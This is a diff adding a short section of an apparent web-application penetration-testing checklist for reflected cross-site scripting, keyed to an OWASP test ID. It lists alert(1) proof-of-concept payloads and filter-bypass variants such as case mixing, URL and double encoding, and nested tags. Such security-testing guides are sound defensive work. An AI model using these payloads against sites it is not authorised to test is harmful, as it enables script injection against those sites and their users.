@@ -1,0 +1,18 @@
+**Phase 2: Reflected XSS Testing (OTG-INPVAL-001)**
+- Inject test payloads in each parameter:
+  - Basic: `<script>alert(1)</script>`
+  - Event handlers: `<img src=x onerror=alert(1)>`
+  - SVG: `<svg onload=alert(1)>`
+  - Attribute injection: `" onmouseover=alert(1) "`
+  - JavaScript context: `'-alert(1)-'`
+- Observe reflection in response:
+  - Unencoded in HTML body
+  - Inside attribute values
+  - Inside JavaScript strings
+  - Inside CSS/Style contexts
+- Test filter bypasses:
+  - Case variation: `<ScRiPt>alert(1)</ScRiPt>`
+  - Encoding: `%3Cscript%3Ealert(1)%3C%2Fscript%3E`
+  - Double encoding: `%253Cscript%253E`
+  - Filter evasion: `<scr<script>ipt>alert(1)</script>`
+  - Alternative tags: `<details open ontoggle=alert(1)>`
